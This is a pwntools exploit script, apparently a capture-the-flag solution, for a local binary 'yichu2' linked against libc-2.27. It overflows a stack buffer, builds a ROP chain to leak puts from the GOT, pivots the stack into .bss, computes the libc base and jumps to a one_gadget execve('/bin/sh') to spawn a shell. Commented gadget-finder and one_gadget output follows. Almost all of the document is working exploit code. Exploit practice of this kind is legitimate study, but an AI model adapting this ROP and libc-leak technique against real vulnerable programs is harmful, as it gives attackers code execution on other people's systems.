from pwn import *
context(log_level='debug',os='linux',arch='amd64',terminal=['tmux','splitw','-h'])

io=process("./yichu2")
elf=ELF("./yichu2")
libc=ELF("./libc-2.27.so")

puts_plt=elf.plt[b"puts"]
puts_got=elf.got[b"puts"]
start=elf.sym[b"main"]

vuln=0x401227
pop_rdi_ret=0x4012a3
leave_ret=0x4011e0
bss_addr=0x404080 #0x404080
payload1=cyclic(0x60)+p64(0xdeadbeef)+p64(pop_rdi_ret)+p64(puts_got)+p64(puts_plt)+p64(vuln)
# payload1=p64(one_gadget)

io.recvuntil(b"Name:\n")
io.sendline(payload1)

# gdb.attach(io)
# pause()

io.recvuntil(b"ffer:\n")
payload2=cyclic(0x20)+p64(bss_addr+0x60)+p64(leave_ret)
io.sendline(payload2)


base_addr=u64(io.recvuntil(b"\x7f").ljust(8,b"\x00"))-libc.sym[b"puts"] 
print("base_addr:  "+hex(base_addr))
one_gadget=0x4f322+base_addr
print("one_gadget:  "+hex(one_gadget))
# str_bin_sh=base_addr+next(libc.search(b"/bin/sh"))
# print("str_bin_sh:  "+hex(str_bin_sh))

# sys_addr=base_addr+libc.sym[b"system"]
# print("sys_addr:  "+hex(sys_addr))

payload2=cyclic(0x27)+p64(one_gadget)
io.sendline(payload2)

io.interactive()




# Gadgets information
# ============================================================
# 0x00000000004011e0 : leave ; ret
# 0x000000000040129c : pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
# 0x000000000040129e : pop r13 ; pop r14 ; pop r15 ; ret
# 0x00000000004012a0 : pop r14 ; pop r15 ; ret
# 0x00000000004012a2 : pop r15 ; ret
# 0x000000000040129b : pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
# 0x000000000040129f : pop rbp ; pop r14 ; pop r15 ; ret
# 0x000000000040115d : pop rbp ; ret
# 0x00000000004012a3 : pop rdi ; ret
# 0x00000000004012a1 : pop rsi ; pop r15 ; ret
# 0x000000000040129d : pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret
# 0x000000000040101a : ret

# Unique gadgets found: 12
# 0x4f2c5 execve("/bin/sh", rsp+0x40, environ)
# constraints:
#   rsp & 0xf == 0
#   rcx == NULL

# 0x4f322 execve("/bin/sh", rsp+0x40, environ)
# constraints:
#   [rsp+0x40] == NULL

# 0x10a38c execve("/bin/sh", rsp+0x70, environ)
# constraints:
#   [rsp+0x70] == NULL